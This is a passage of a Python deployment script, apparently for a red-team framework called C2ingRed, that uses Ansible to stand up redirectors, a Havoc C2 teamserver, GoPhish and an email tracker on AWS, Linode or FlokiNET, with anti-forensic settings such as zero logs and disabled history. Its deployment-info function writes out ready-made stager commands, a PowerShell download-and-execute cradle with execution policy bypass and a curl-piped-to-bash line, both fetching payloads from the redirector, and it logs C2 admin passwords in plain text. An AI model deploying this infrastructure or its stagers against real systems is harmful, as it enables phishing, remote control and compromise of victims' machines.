        print("\nPlease install them to ensure proper functionality.")
        print("You can install Python dependencies with: pip install -r requirements.txt")
        
        if "ansible" in missing:
            print("\nTo install Ansible: pip install ansible")
        
        if "aws" in missing:
            print("\nTo install AWS CLI: pip install awscli")
        
        if "linode-cli" in missing:
            print("\nTo install Linode CLI: pip install linode-cli")
        
        confirm = input("\nContinue anyway? (y/n): ").lower()
        if confirm != 'y':
            sys.exit(1)

def teardown_infrastructure(config):
    """Tear down existing infrastructure with just provider and deployment_id"""
    provider = config['provider']
    deployment_id = config['deployment_id']
    
    # Ensure we have the correct provider directory
    provider_dir = PROVIDER_DIRS.get(provider, provider.capitalize())
    logging.info(f"Tearing down {provider} infrastructure for deployment ID {deployment_id}...")
    
    # Check for infrastructure state file first
    infra_state_file = f"infrastructure_state_{deployment_id}.json"
    infra_data = {}
    
    if os.path.exists(infra_state_file):
        try:
            with open(infra_state_file, 'r') as f:
                infra_data = json.load(f)
                logging.info(f"Loaded infrastructure state from {infra_state_file}")
                
            # Use the region from the state file
            if 'region' in infra_data:
                if provider == "aws":
                    config['aws_region'] = infra_data['region']
                    logging.info(f"Using region from state file: {infra_data['region']}")
                elif provider == "linode":
                    config['linode_region'] = infra_data['region']
                    config['region'] = infra_data['region']
                    logging.info(f"Using region from state file: {infra_data['region']}")
        except Exception as e:
            logging.warning(f"Failed to load infrastructure state file: {e}")
    else:
        logging.warning(f"No infrastructure state file found: {infra_state_file}")
        
    # Load credentials from vars.yaml if not provided
    vars_file = f"{provider_dir}/vars.yaml"
    vars_data = {}
    if os.path.exists(vars_file):
        try:
            with open(vars_file, 'r') as f:
                vars_data = yaml.safe_load(f) or {}
            logging.info(f"Loaded configuration from {vars_file}")
        except Exception as e:
            logging.warning(f"Failed to load {vars_file}: {e}")
    
    # Set provider-specific environment variables
    if provider == "aws":
        if config.get('aws_access_key'):
            os.environ['AWS_ACCESS_KEY_ID'] = config['aws_access_key']
        elif vars_data.get('aws_access_key'):
            os.environ['AWS_ACCESS_KEY_ID'] = vars_data['aws_access_key']
            config['aws_access_key'] = vars_data['aws_access_key']
            
        if config.get('aws_secret_key'):
            os.environ['AWS_SECRET_ACCESS_KEY'] = config['aws_secret_key']
        elif vars_data.get('aws_secret_key'):
            os.environ['AWS_SECRET_ACCESS_KEY'] = vars_data['aws_secret_key']
            config['aws_secret_key'] = vars_data['aws_secret_key']
    
    # Set default resource names based on deployment ID
    config['redirector_name'] = f"r-{deployment_id}"
    config['c2_name'] = f"s-{deployment_id}"
    config['tracker_name'] = f"t-{deployment_id}"
    
    print(f"\n{COLORS['YELLOW']}Teardown Operation{COLORS['RESET']}")
    print(f"{COLORS['YELLOW']}============================={COLORS['RESET']}")
    print(f"Provider:      {provider}")
    print(f"Deployment ID: {deployment_id}")
    if provider == "aws":
        print(f"Region:        {config.get('aws_region', 'Unknown')}")
    else:
        print(f"Region:        {config.get('region', 'Unknown')}")
    print(f"Resources:")
    print(f"  - Redirector: {config['redirector_name']}")
    print(f"  - C2 Server:  {config['c2_name']}")
    print(f"  - Tracker:    {config['tracker_name']}")
    print(f"{COLORS['YELLOW']}============================={COLORS['RESET']}")
    
    # Quick confirmation outside of Ansible playbook
    user_confirm = input(f"\n{COLORS['YELLOW']}Proceed with teardown? (yes/no): {COLORS['RESET']}")
    if user_confirm.lower() != 'yes':
        print(f"\n{COLORS['RED']}Teardown cancelled.{COLORS['RESET']}")
        return False
    
    # Run cleanup playbook
    playbook = f"{provider_dir}/cleanup.yml"
    if os.path.exists(playbook):
        # Create inventory file
        fd, inventory_path = tempfile.mkstemp(prefix="inventory_teardown_", suffix=".ini")
        with os.fdopen(fd, 'w') as f:
            f.write("[local]\nlocalhost ansible_connection=local\n")
            
        # Build the command with all necessary variables
        cmd = [
            "ansible-playbook",
            "-i", inventory_path,
            playbook,
            "-e", f"deployment_id={deployment_id}",
            "-e", "confirm_cleanup=false",
            "-e", "force=true",
            "-e", f"redirector_name=r-{deployment_id}",
            "-e", f"c2_name=s-{deployment_id}",
            "-e", f"tracker_name=t-{deployment_id}",
            "-e", "cleanup_redirector=true",
            "-e", "cleanup_c2=true",
            "-e", "cleanup_tracker=true"
        ]
        
        # Add region information
        if provider == "aws":
            cmd.extend([
                "-e", f"aws_access_key={config.get('aws_access_key', '')}",
                "-e", f"aws_secret_key={config.get('aws_secret_key', '')}",
                "-e", f"aws_region={config.get('aws_region', 'us-east-1')}"
            ])
        elif provider == "linode":
            cmd.extend([
                "-e", f"linode_token={config.get('linode_token', '')}",
                "-e", f"region={config.get('region', '')}"
            ])
            
        # Add infra data from state file if available
        if infra_data:
            for key, value in infra_data.items():
                cmd.extend(["-e", f"{key}={value}"])
        
        # Add verbosity
        if debug_mode:
            cmd.append("-vvv")
            
        try:
            logging.info(f"Running teardown command: {' '.join(cmd)}")
            
            # Use subprocess.Popen for real-time output
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1  # Line buffered
            )
            
            # Stream output in real-time
            for line in iter(process.stdout.readline, ''):
                print(line.rstrip())
            
            # Wait for completion
            return_code = process.wait()
            
            if return_code == 0:
                print(f"\n{COLORS['GREEN']}Teardown completed successfully!{COLORS['RESET']}")
                return True
            else:
                # Get any remaining error output
                stderr = process.stderr.read()
                print(f"\n{COLORS['RED']}Teardown failed with return code {return_code}{COLORS['RESET']}")
                if stderr:
                    print(f"\n{COLORS['RED']}Error output:{COLORS['RESET']}\n{stderr}")
                return False
                
        except Exception as e:
            logging.error(f"Error running teardown command: {e}")
            print(f"\n{COLORS['RED']}Failed to execute teardown: {e}{COLORS['RESET']}")
            return False
        finally:
            if os.path.exists(inventory_path):
                os.unlink(inventory_path)
    else:
        print(f"\n{COLORS['RED']}Cleanup playbook not found at {playbook}{COLORS['RESET']}")
        return False

def deploy_tracker(config):
    """Deploy email tracking server with minimal resources"""
    provider = config['provider']
    provider_dir = PROVIDER_DIRS.get(provider, provider.upper())
    
    logging.info(f"Deploying tracker on {provider}...")
    
    # Set provider-specific environment variables
    if provider == "aws":
        if config.get('aws_access_key'):
            os.environ['AWS_ACCESS_KEY_ID'] = config['aws_access_key']
        if config.get('aws_secret_key'):
            os.environ['AWS_SECRET_ACCESS_KEY'] = config['aws_secret_key']
    elif provider == "linode":
        if config.get('linode_token'):
            os.environ['LINODE_TOKEN'] = config['linode_token']
    
    # Override configuration for minimal tracker deployment
    tracker_config = config.copy()
    
    # Use smaller instance sizes for tracker
    if provider == "linode":
        tracker_config['plan'] = 'g6-nanode-1'  # Smallest viable Linode plan
        tracker_config['image'] = 'linode/debian12'  # Use Debian instead of Kali
    elif provider == "aws":
        tracker_config['instance_type'] = 't2.micro'  # Smallest viable AWS instance
        # For AWS, specify a Debian/Ubuntu AMI instead of Kali
        if 'ami_map' in tracker_config:
            # Try to find a Debian/Ubuntu AMI for the region
            region = tracker_config.get('aws_region', tracker_config.get('region'))
            for ami_id, ami_info in tracker_config.get('ami_map', {}).items():
                if 'ubuntu' in ami_id.lower() or 'debian' in ami_id.lower():
                    tracker_config['ami_id'] = ami_id
                    break
    
    # Determine playbook path
    playbook = f"{provider_dir}/tracker.yml"
    if not os.path.exists(playbook):
        logging.error(f"Tracker playbook not found at {playbook}")
        return False
    
    # Create inventory file
    inventory_path = create_inventory_file(tracker_config, "local")
    
    # Run the playbook
    try:
        success, stdout, stderr = run_ansible_playbook(
            playbook, inventory_path, tracker_config, tracker_config.get('debug', False)
        )
        
        # Clean up inventory file
        if os.path.exists(inventory_path):
            os.unlink(inventory_path)
        
        return success
    except Exception as e:
        logging.error(f"Tracker deployment failed: {e}")
        
        # Clean up inventory file
        if os.path.exists(inventory_path):
            os.unlink(inventory_path)
        
        return False

def generate_deployment_info(config, success=True):
    """Generate a comprehensive deployment information log file"""
    deployment_id = config.get('deployment_id', generate_random_string())
    log_file = os.path.join("logs", f"deployment_info_{deployment_id}.log")
    
    # Ensure log directory exists
    os.makedirs("logs", exist_ok=True)
    
    # Start collecting information
    info = []
    info.append("=" * 80)
    info.append(f"C2ingRed Deployment Information - {deployment_id}")
    info.append("=" * 80)
    info.append("")
    
    # Basic deployment info
    info.append("DEPLOYMENT OVERVIEW")
    info.append("-----------------")
    info.append(f"Deployment ID: {deployment_id}")
    info.append(f"Deployment Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    info.append(f"Provider: {config.get('provider', 'N/A')}")
    info.append(f"Deployment Status: {'SUCCESS' if success else 'FAILED'}")
    info.append(f"Domain: {config.get('domain', 'N/A')}")
    
    # Deployment type
    deployment_type = "Full Deployment"
    if config.get('redirector_only'):
        deployment_type = "Redirector Only"
    elif config.get('c2_only'):
        deployment_type = "C2 Server Only"
    elif config.get('deploy_tracker') and not config.get('integrated_tracker'):
        deployment_type = "Standalone Tracker"
    elif config.get('deploy_tracker') and config.get('integrated_tracker'):
        deployment_type = "Full Deployment with Integrated Tracker"
    info.append(f"Deployment Type: {deployment_type}")
    info.append("")
    
    # Server Information
    info.append("SERVER INFORMATION")
    info.append("-----------------")
    ssh_key = config.get('ssh_key', 'N/A')
    
    # Determine SSH user based on provider
    if config.get('ssh_user'):
        ssh_user = config.get('ssh_user')
    elif config.get('provider') == 'aws':
        ssh_user = config.get('ami_ssh_user', 'kali')
    elif config.get('provider') == 'linode':
        ssh_user = 'root'
    else:
        ssh_user = DEFAULT_SSH_USER.get(config.get('provider', 'aws'), 'root')
    
    if not config.get('c2_only'):
        redirector_ip = config.get('redirector_ip', 'N/A')
        info.append("Redirector:")
        info.append(f"  Name: {config.get('redirector_name', 'N/A')}")
        info.append(f"  IP: {redirector_ip}")
        info.append(f"  Domain: {config.get('redirector_subdomain', 'cdn')}.{config.get('domain', 'N/A')}")
        # SSH command for redirector
        if redirector_ip != 'N/A' and ssh_key != 'N/A':
            info.append(f"  SSH Command: ssh -i {ssh_key} {ssh_user}@{redirector_ip}")
    
    if not config.get('redirector_only'):
        c2_ip = config.get('c2_ip', 'N/A')
        info.append("C2 Server:")
        info.append(f"  Name: {config.get('c2_name', 'N/A')}")
        info.append(f"  IP: {c2_ip}")
        info.append(f"  Domain: {config.get('c2_subdomain', 'mail')}.{config.get('domain', 'N/A')}")
        # SSH command for C2
        if c2_ip != 'N/A' and ssh_key != 'N/A':
            info.append(f"  SSH Command: ssh -i {ssh_key} {ssh_user}@{c2_ip}")
    
    if config.get('deploy_tracker') and not config.get('integrated_tracker'):
        tracker_ip = config.get('tracker_ip', 'N/A')
        info.append("Tracker Server:")
        info.append(f"  Name: {config.get('tracker_name', 'N/A')}")
        info.append(f"  IP: {tracker_ip}")
        info.append(f"  Domain: {config.get('tracker_domain', 'track.' + config.get('domain', 'N/A'))}")
        # SSH command for tracker
        if tracker_ip != 'N/A' and ssh_key != 'N/A':
            info.append(f"  SSH Command: ssh -i {ssh_key} {ssh_user}@{tracker_ip}")
    
    info.append("")
    
    # SSH Information
    info.append("SSH INFORMATION")
    info.append("--------------")
    # Determine correct SSH key path based on provider
    if config.get('provider') == "aws":
        # AWS uses .pem extension and c2deploy_[deployment_id].pem naming
        ssh_key = f"~/.ssh/c2deploy_{deployment_id}.pem"
    else:
        # Use the standard key path if defined
        ssh_key = config.get('ssh_key', f"~/.ssh/c2deploy_{deployment_id}")

    info.append(f"SSH Key: {ssh_key}")

    # Determine SSH user based on provider
    if config.get('ssh_user'):
        ssh_user = config.get('ssh_user')
    elif config.get('provider') == 'aws':
        ssh_user = config.get('ami_ssh_user', 'kali')
    elif config.get('provider') == 'linode':
        ssh_user = 'root'
    else:
        ssh_user = DEFAULT_SSH_USER.get(config.get('provider', 'aws'), 'root')

    info.append(f"SSH User: {ssh_user}")

    # Add correct SSH commands for each server type
    if not config.get('redirector_only'):
        info.append(f"SSH Command for C2: ssh -t -o 'StrictHostKeyChecking=no' -o 'UserKnownHostsFile=/dev/null' -o 'IdentitiesOnly=yes' -i {ssh_key} {ssh_user}@{config.get('c2_ip', 'N/A')}")

    if not config.get('c2_only'):
        info.append(f"SSH Command for Redirector: ssh -t -o 'StrictHostKeyChecking=no' -o 'UserKnownHostsFile=/dev/null' -o 'IdentitiesOnly=yes' -i {ssh_key} {ssh_user}@{config.get('redirector_ip', 'N/A')}")

    if config.get('deploy_tracker') and not config.get('integrated_tracker'):
        info.append(f"SSH Command for Tracker: ssh -t -o 'StrictHostKeyChecking=no' -o 'UserKnownHostsFile=/dev/null' -o 'IdentitiesOnly=yes' -i {ssh_key} {ssh_user}@{config.get('tracker_ip', 'N/A')}")

    if config.get('ssh_port'):
        info.append(f"SSH Port: {config.get('ssh_port')}")
    info.append("")
    
    # Extract Havoc C2 information - check all possible variable names
    havoc_admin_user = config.get('havoc_admin_user') or config.get('admin_user') or 'admin'
    havoc_admin_password = config.get('havoc_admin_password') or config.get('admin_pass')
    havoc_teamserver_port = config.get('havoc_teamserver_port') or config.get('teamserver_port') or 40056
    havoc_http_port = config.get('havoc_http_port') or config.get('http_port') or 8080
    havoc_https_port = config.get('havoc_https_port') or config.get('https_port') or 443
    shell_handler_port = config.get('shell_handler_port') or 4444
    gophish_admin_port = config.get('gophish_admin_port') or 3333
    
    # Port Information
    info.append("PORT INFORMATION")
    info.append("---------------")
    info.append(f"HTTP Port: {havoc_http_port}")
    info.append(f"HTTPS Port: {havoc_https_port}")
    info.append(f"Teamserver Port: {havoc_teamserver_port}")
    info.append(f"Shell Handler Port: {shell_handler_port}")
    info.append(f"GoPhish Admin Port: {gophish_admin_port}")
    info.append("")
    
    # Havoc C2 Credentials
    info.append("HAVOC C2 CREDENTIALS")
    info.append("------------------")
    info.append(f"Admin User: {havoc_admin_user}")
    if havoc_admin_password:
        info.append(f"Admin Password: {havoc_admin_password}")
    else:
        info.append("Admin Password: Check /root/Tools/Havoc/data/profiles/default.yaotl on C2 server")
    info.append("")
    
    # DNS Configuration
    info.append("DNS CONFIGURATION")
    info.append("----------------")
    info.append("Required DNS Records:")
    if not config.get('c2_only'):
        info.append(f"  {config.get('redirector_subdomain', 'cdn')}.{config.get('domain', 'example.com')} -> {config.get('redirector_ip', 'N/A')} (A Record)")
    
    if not config.get('redirector_only'):
        info.append(f"  {config.get('c2_subdomain', 'mail')}.{config.get('domain', 'example.com')} -> {config.get('c2_ip', 'N/A')} (A Record)")
        info.append(f"  {config.get('domain', 'example.com')} -> {config.get('c2_ip', 'N/A')} (A Record)")
    
    if config.get('deploy_tracker') and not config.get('integrated_tracker'):
        info.append(f"  {config.get('tracker_domain', 'track.' + config.get('domain', 'example.com'))} -> {config.get('tracker_ip', 'N/A')} (A Record)")
    elif config.get('deploy_tracker') and config.get('integrated_tracker'):
        info.append(f"  {config.get('tracker_domain', 'track.' + config.get('domain', 'example.com'))} -> {config.get('c2_ip', 'N/A')} (A Record)")
    
    info.append("")
    
    # OPSEC Settings
    info.append("OPSEC SETTINGS")
    info.append("-------------")
    info.append(f"Zero Logs: {'Enabled' if config.get('zero_logs') else 'Disabled'}")
    info.append(f"Secure Memory: {'Enabled' if config.get('secure_memory') else 'Disabled'}")
    info.append(f"Command History: {'Disabled' if config.get('disable_history') else 'Enabled'}")
    info.append(f"Randomized Ports: {'Enabled' if config.get('randomize_ports') else 'Disabled'}")
    info.append("")
    
    # Connection Commands
    info.append("CONNECTION COMMANDS")
    info.append("-----------------")
    
    if not config.get('redirector_only'):
        c2_ip = config.get('c2_ip', 'YOUR_C2_IP')
        info.append(f"Havoc Teamserver: ./havoc client --address {c2_ip}:{havoc_teamserver_port} --username {havoc_admin_user} --password {havoc_admin_password or '[password]'}")
    
    if not config.get('c2_only'):
        redirector_domain = f"{config.get('redirector_subdomain', 'cdn')}.{config.get('domain', 'example.com')}"
        info.append(f"PowerShell Payload: powershell -exec bypass -c \"iex(New-Object Net.WebClient).DownloadString('https://{redirector_domain}/windows_stager.ps1')\"")
        info.append(f"Linux Payload: curl -s https://{redirector_domain}/linux_stager.sh | bash")
    
    info.append("")
    
    # Post-Deployment Instructions
    info.append("POST-DEPLOYMENT INSTRUCTIONS")
    info.append("--------------------------")
    info.append("1. Configure DNS records as listed above")
    info.append("2. Run the post-install script on your C2 server:")
    info.append("   /root/Tools/post_install_c2.sh")
    if not config.get('c2_only'):
        info.append("3. Run the post-install script on your redirector:")
        info.append("   /root/Tools/post_install_redirector.sh")
    
    info.append("")
    info.append("CLEANUP COMMAND")
    info.append("---------------")
    info.append(f"python3 deploy.py --teardown --provider {config.get('provider', 'PROVIDER')} --deployment-id {deployment_id}")
    if config.get('provider') == 'linode':
        info.append(f"Additional parameters: --linode-token YOUR_TOKEN")
    elif config.get('provider') == 'aws':
        info.append(f"Additional parameters: --aws-key YOUR_KEY --aws-secret YOUR_SECRET")
    
    # Write to file
    with open(log_file, 'w') as f:
        f.write('\n'.join(info))
    
    logging.info(f"Deployment information saved to {log_file}")
    return log_file

def deploy_cross_provider(config, redirector_provider, c2_provider):
    """Deploy infrastructure across multiple providers"""
    # Create copies of config for each provider
    redirector_config = config.copy()
    redirector_config['provider'] = redirector_provider
    redirector_config['c2_only'] = False
    redirector_config['redirector_only'] = True
    
    c2_config = config.copy()
    c2_config['provider'] = c2_provider
    c2_config['c2_only'] = True
    c2_config['redirector_only'] = False
    
    # Set specific regions if provided
    if config.get('redirector_region'):
        redirector_config['region'] = config['redirector_region']
    if config.get('c2_region'):
        c2_config['region'] = config['c2_region']
    
    logging.info(f"Cross-provider deployment: Redirector using {redirector_provider} in {redirector_config.get('region', 'default region')}")
    
    # Deploy redirector first
    redirector_success = deploy_infrastructure(redirector_config)
    
    if not redirector_success:
        logging.error("Redirector deployment failed!")
        return False
    
    # Pass redirector IP to C2 config
    if 'redirector_ip' in redirector_config:
        c2_config['redirector_ip'] = redirector_config['redirector_ip']
        config['redirector_ip'] = redirector_config['redirector_ip']
    
    logging.info(f"Cross-provider deployment: C2 server using {c2_provider} in {c2_config.get('region', 'default region')}")
    
    # Deploy C2 server
    c2_success = deploy_infrastructure(c2_config)
    
    if not c2_success:
        logging.error("C2 server deployment failed!")
        return False
    
    # Update the original config with IPs from both deployments
    if 'c2_ip' in c2_config:
        config['c2_ip'] = c2_config['c2_ip']
    
    return True

def main():
    """Main function to run the deployment"""
    global debug_mode, deployment_id
    
    # Check if any command-line arguments were provided
    if len(sys.argv) > 1:
        # Arguments provided, use the original CLI flow
        args = parse_arguments()
        
        # Generate a deployment ID FIRST - before any other operations
        if hasattr(args, 'deployment_id') and args.deployment_id:
            deployment_id = args.deployment_id
        else:
            deployment_id = generate_deployment_id()
        
        # Set up logging with our consistent deployment ID
        log_file = setup_logging(deployment_id, "deployment")
        
        # Set debug mode from args
        if hasattr(args, 'debug') and args.debug:
            debug_mode = True
            os.environ["ANSIBLE_VERBOSITY"] = "3"
        
        # Check dependencies
        check_dependencies()
        
        # Check if this is a teardown operation
        if hasattr(args, 'teardown') and args.teardown:
            # Initialize a minimal config for teardown
            config = {
                'provider': args.provider,
                'deployment_id': args.deployment_id,
                'debug': True,  # Force debug mode for teardown
                'force': True   # Force deletion without confirmation inside playbooks
            }
            
            # Set up logging specifically for teardown operation
            log_file = setup_logging(args.deployment_id, "teardown")
            
            # Add provider-specific credentials if provided
            if args.provider == "aws":
                if hasattr(args, 'aws_key') and args.aws_key:
                    config['aws_access_key'] = args.aws_key
                if hasattr(args, 'aws_secret') and args.aws_secret:
                    config['aws_secret_key'] = args.aws_secret
                if hasattr(args, 'aws_region') and args.aws_region:
                    config['aws_region'] = args.aws_region
            elif args.provider == "linode":
                if hasattr(args, 'linode_token') and args.linode_token:
                    config['linode_token'] = args.linode_token
                if hasattr(args, 'linode_region') and args.linode_region:
                    config['linode_region'] = args.linode_region
            
            # Execute teardown and return
            success = teardown_infrastructure(config)
            if not success:
                sys.exit(1)
            return
        
        # Check if this is a test operation
        if hasattr(args, 'run_tests') and args.run_tests:
            run_tests(vars(args))
            return
            
        # Override provider if --flokinet is specified
        if hasattr(args, 'flokinet') and args.flokinet:
            args.provider = "flokinet"
        
        # Validate deployment mode
        if hasattr(args, 'redirector_only') and hasattr(args, 'c2_only') and args.redirector_only and args.c2_only:
            logging.error("Cannot specify both --redirector-only and --c2-only")
            return
        
        # Load variables from provider-specific vars.yaml if provider is specified
        vars_data = {}
        if hasattr(args, 'provider') and args.provider:
            provider_dir = PROVIDER_DIRS.get(args.provider, args.provider.upper())
            vars_file = f"{provider_dir}/vars.yaml"
            if os.path.exists(vars_file):
                try:
                    with open(vars_file, 'r') as f:
                        vars_data = yaml.safe_load(f) or {}
                    logging.info(f"Loaded configuration from {vars_file}")
                except Exception as e:
                    logging.warning(f"Failed to load {vars_file}: {e}")
        
        # Handle the interactive flag
        if hasattr(args, 'interactive') and args.interactive:
            config = interactive_setup()  # Don't pass deployment_id here anymore
        else:
            # Build configuration by combining args and vars_data
            config = {}
            
            # Copy all values from vars_data to config first
            for key, value in vars_data.items():
                config[key] = value
            
            # Provider settings
            if hasattr(args, 'provider'):
                config['provider'] = args.provider
            
            # Store the deployment ID only if explicitly specified
            if hasattr(args, 'deployment_id') and args.deployment_id:
                config['deployment_id'] = args.deployment_id

            # Use consistent deployment ID for all resource names only if set
            if 'deployment_id' in config and config['deployment_id']:
                if hasattr(args, 'redirector_name'):
                    config['redirector_name'] = args.redirector_name or f"r-{config['deployment_id']}"
                if hasattr(args, 'c2_name'):
                    config['c2_name'] = args.c2_name or f"s-{config['deployment_id']}"
                if hasattr(args, 'tracker_name'):
                    config['tracker_name'] = args.tracker_name or f"t-{config['deployment_id']}"
            
            # Subdomain settings - ensure these are explicitly set
            if hasattr(args, 'redirector_subdomain'):
                config['redirector_subdomain'] = args.redirector_subdomain or 'cdn'
            if hasattr(args, 'c2_subdomain'):
                config['c2_subdomain'] = args.c2_subdomain or 'mail'
            
            # AWS settings
            if args.provider == "aws":
                if hasattr(args, 'aws_key'):
                    config['aws_access_key'] = args.aws_key or vars_data.get('aws_access_key')
                if hasattr(args, 'aws_secret'):
                    config['aws_secret_key'] = args.aws_secret or vars_data.get('aws_secret_key')
                if hasattr(args, 'aws_region'):
                    config['aws_region'] = args.aws_region or args.region or vars_data.get('aws_region')
                config['aws_region_choices'] = vars_data.get('aws_region_choices', [])
                config['ami_map'] = vars_data.get('ami_map', {})
                if hasattr(args, 'size'):
                    config['size'] = args.size or vars_data.get('aws_instance_type', 't2.medium')
            
            # Linode settings
            elif args.provider == "linode":
                if hasattr(args, 'linode_token'):
                    config['linode_token'] = args.linode_token or vars_data.get('linode_token')
                if hasattr(args, 'linode_region'):
                    config['linode_region'] = args.linode_region or args.region or vars_data.get('linode_region')
                # Ensure region_choices are correctly set
                config['region_choices'] = vars_data.get('region_choices', [])
                if hasattr(args, 'size'):
                    config['plan'] = args.size or vars_data.get('plan', 'g6-standard-2')
                config['image'] = vars_data.get('image', 'linode/kali')
                config['redirector_image'] = vars_data.get('redirector_image', 'linode/debian11')
            
            # FlokiNET settings
            elif args.provider == "flokinet":
                if hasattr(args, 'flokinet_redirector_ip'):
                    config['flokinet_redirector_ip'] = args.flokinet_redirector_ip or vars_data.get('redirector_ip')
                if hasattr(args, 'flokinet_c2_ip'):
                    config['flokinet_c2_ip'] = args.flokinet_c2_ip or vars_data.get('c2_ip')
                config['flokinet_region_choices'] = vars_data.get('flokinet_region_choices', [])
                config['ssh_port'] = vars_data.get('ssh_port', 22)
            
            # SSH settings - explicitly set SSH user to avoid template recursion
            if args.provider == "linode":
                config['ssh_user'] = "root"
            elif args.provider == "aws":
                config['ssh_user'] = "kali"
            else:
                if hasattr(args, 'ssh_user'):
                    config['ssh_user'] = args.ssh_user or vars_data.get('ssh_user') or DEFAULT_SSH_USER.get(args.provider)
                    
            # ONLY generate an SSH key if needed - not for teardown operations
            if hasattr(args, 'ssh_key'):
                config['ssh_key'] = os.path.expanduser(args.ssh_key)
            
            # Deployment options
            if hasattr(args, 'redirector_only'):
                config['redirector_only'] = args.redirector_only
            if hasattr(args, 'c2_only'):
                config['c2_only'] = args.c2_only
            if hasattr(args, 'debug'):
                config['debug'] = args.debug
            if hasattr(args, 'domain'):
                config['domain'] = args.domain or vars_data.get('domain', 'example.com')
            if hasattr(args, 'letsencrypt_email'):
                config['letsencrypt_email'] = args.letsencrypt_email or vars_data.get('letsencrypt_email', f"admin@{config['domain']}")
            
            # OPSEC settings
            if hasattr(args, 'disable_history'):
                config['disable_history'] = args.disable_history if args.disable_history is not None else vars_data.get('disable_history', True)
            if hasattr(args, 'secure_memory'):
                config['secure_memory'] = args.secure_memory if args.secure_memory is not None else vars_data.get('secure_memory', True)
            if hasattr(args, 'zero_logs'):
                config['zero_logs'] = args.zero_logs if args.zero_logs is not None else vars_data.get('zero_logs', True)
            if hasattr(args, 'randomize_ports'):
                config['randomize_ports'] = args.randomize_ports if args.randomize_ports is not None else vars_data.get('randomize_ports', False)
            
            # Other settings from vars_data
            config['gophish_admin_port'] = vars_data.get('gophish_admin_port', str(random.randint(2000, 9000)))
            config['smtp_auth_user'] = vars_data.get('smtp_auth_user', f"user{random.randint(1000, 9999)}")
            config['smtp_auth_pass'] = vars_data.get('smtp_auth_pass', ''.join(random.choices(string.ascii_letters + string.digits, k=20)))
            config['shell_handler_port'] = vars_data.get('shell_handler_port', str(random.randint(4000, 65000)))
            config['havoc_teamserver_port'] = vars_data.get('havoc_teamserver_port', '40056')
            config['havoc_http_port'] = vars_data.get('havoc_http_port', '8080')
            config['havoc_https_port'] = vars_data.get('havoc_https_port', '443')
            
            # Tracker options
            if hasattr(args, 'deploy_tracker'):
                config['deploy_tracker'] = args.deploy_tracker
                if hasattr(args, 'integrated_tracker'):
                    config['integrated_tracker'] = args.integrated_tracker
                if args.deploy_tracker:
                    if hasattr(args, 'tracker_domain'):
                        config['tracker_domain'] = args.tracker_domain or f"track.{config['domain']}"
                    if hasattr(args, 'tracker_email'):
                        config['tracker_email'] = args.tracker_email or config['letsencrypt_email']
                    if hasattr(args, 'tracker_ipinfo_token'):
                        config['tracker_ipinfo_token'] = args.tracker_ipinfo_token
                    if hasattr(args, 'tracker_setup_ssl'):
                        config['tracker_setup_ssl'] = args.tracker_setup_ssl
                    
                    # Set the integrated tracker flag for deployment
                    if args.integrated_tracker:
                        config['setup_integrated_tracker'] = True
            
            # SSH after deploy
            if hasattr(args, 'ssh_after_deploy'):
                config['ssh_after_deploy'] = args.ssh_after_deploy
            
            # Run tests
            if hasattr(args, 'run_tests'):
                config['run_tests'] = args.run_tests
        
        # Run deployment
        try:
            # Deploy the standard infrastructure first (redirector + C2)
            if not config.get('deploy_tracker') or config.get('integrated_tracker'):
                success = deploy_infrastructure(config)
                if not success:
                    logging.error("Deployment failed!")
                    deployment_info_log = generate_deployment_info(config, success=False)
                    print(f"\nDeployment information saved to: {deployment_info_log}")
                    cleanup_resources(config, interactive=True)
                    return
                logging.info("Deployment completed successfully!")
                deployment_info_log = generate_deployment_info(config, success=True)
                print(f"\nDeployment information saved to: {deployment_info_log}")
                
                # SSH into instance if requested
                if config.get('ssh_after_deploy'):
                    ssh_to_instance(config)
            
            # Deploy standalone tracker if requested and not integrated
            elif config.get('deploy_tracker') and not config.get('integrated_tracker'):
                success = deploy_tracker(config)
                if not success:
                    logging.error("Tracker deployment failed!")
                    deployment_info_log = generate_deployment_info(config, success=False)
                    print(f"\nDeployment information saved to: {deployment_info_log}")
                    cleanup_resources(config, interactive=True)
                    return
                logging.info("Tracker deployment completed successfully!")
                deployment_info_log = generate_deployment_info(config, success=True)
                print(f"\nDeployment information saved to: {deployment_info_log}")
                
                # SSH into tracker if requested
                if config.get('ssh_after_deploy'):
                    ssh_to_instance(config)
                    
        except KeyboardInterrupt:
            print("\n\nDeployment interrupted by user")
            logging.info("Deployment interrupted by user")
            deployment_info_log = generate_deployment_info(config, success=False)
            print(f"\nDeployment information saved to: {deployment_info_log}")
            try:
                cleanup_resources(config, interactive=True)
            except KeyboardInterrupt:
                print("\nCleanup interrupted. Resources may still exist.")
                logging.warning("Cleanup interrupted by user. Resources may still exist.")
        except Exception as e:
            logging.error(f"Deployment failed with error: {e}")
            deployment_info_log = generate_deployment_info(config, success=False)
            print(f"\nDeployment information saved to: {deployment_info_log}")
            if config.get('debug'):
                import traceback
                traceback.print_exc()
                logging.debug(traceback.format_exc())
            try:
                cleanup_resources(config, interactive=True)
            except KeyboardInterrupt:
                print("\nCleanup interrupted. Resources may still exist.")
                logging.warning("Cleanup interrupted by user. Resources may still exist.")
    else:
        # No arguments - launch the interactive menu
        try:
            # Check dependencies
            check_dependencies()
            
            # Launch the menu
            main_menu()
        except KeyboardInterrupt:
            print(f"\n\n{COLORS['YELLOW']}Operation interrupted by user.{COLORS['RESET']}")
            sys.exit(0)

if __name__ == "__main__":
    main()
